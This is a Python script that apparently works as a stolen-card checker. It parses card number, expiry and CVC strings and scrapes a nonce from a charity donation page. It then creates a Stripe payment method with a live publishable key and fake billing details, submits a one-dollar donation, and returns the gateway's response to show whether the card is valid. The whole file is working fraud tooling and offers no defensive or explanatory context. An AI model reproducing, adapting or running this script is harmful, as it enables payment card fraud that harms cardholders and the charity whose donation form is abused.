import requests
import re
import random
import string

def Tele(ccx):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return "Error: Invalid CC format"

    if "20" in yy:
        yy = yy.split("20")[1]

    def generate_user_agent():
        return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"

    def generate_username():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=20))
        return f"{name}{number}"

    def generate_random_code(length=32):
        letters_and_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_and_digits) for _ in range(length))

    user = generate_user_agent()
    acc = generate_random_account()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    r = requests.session()

    headers = {
        'authority': 'needhelped.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'referer': 'https://needhelped.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    try:
        r0 = r.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', cookies=r.cookies, headers=headers)
        nonce = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', r0.text).group(1)
    except Exception as e:
        return f"Error fetching nonce: {e}"

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }

    data = (
        f'type=card&billing_details[name]=Baign+Raja&billing_details[email]={acc}&billing_details[address][city]=Wilmot'
        f'&billing_details[address][country]=US&billing_details[address][line1]=32300+116th+St'
        f'&billing_details[address][postal_code]=10080&billing_details[address][state]=Wisconsin'
        f'&billing_details[phone]=8473614926&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}'
        f'&card[exp_year]={yy}&guid=cac2827d-5443-419b-8bac-ee21c1f75eb51067b2&muid=5d71c189-c1a5-4740-b272-5d4179dcb6e7d4f664'
        f'&sid=66707dbb-c963-4279-87b5-5545046cf6fdbc90cd&payment_user_agent=stripe.js%2F1e94022f39%3B+stripe-js-v3%2F1e94022f39%3B+card-element'
        f'&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=51669&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
    )

    try:
        r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        response_json = r1.json()
        id = response_json.get('id')
        if not id:
            return f"Error: No 'id' in response. Response: {response_json}"
    except Exception as e:
        return f"Error creating payment method: {e}"

    headers = {
        'authority': 'needhelped.com',
        'accept': 'application/json, text/javascript, /; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://needhelped.com',
        'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'charitable_form_id': '67ab768b8d4b1',
        '67ab768b8d4b1': '',
        '_charitable_donation_nonce': nonce,
        '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
        'campaign_id': '1164',
        'description': 'Poor Children Donation Support',
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'first_name': 'Baign',
        'last_name': 'Raja',
        'email': 'Jjuuu818@gmail.com',
        'address': '32300 116th St',
        'address_2': '',
        'city': 'Wilmot',
        'state': 'Wisconsin',
        'postcode': '53192',
        'country': 'US',
        'phone': '8473614926',
        'gateway': 'stripe',
        'stripe_payment_method': id,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }

    try:
        r2 = r.post('https://needhelped.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        return r2.json()
    except Exception as e:
        return f"Error making donation: {e}"
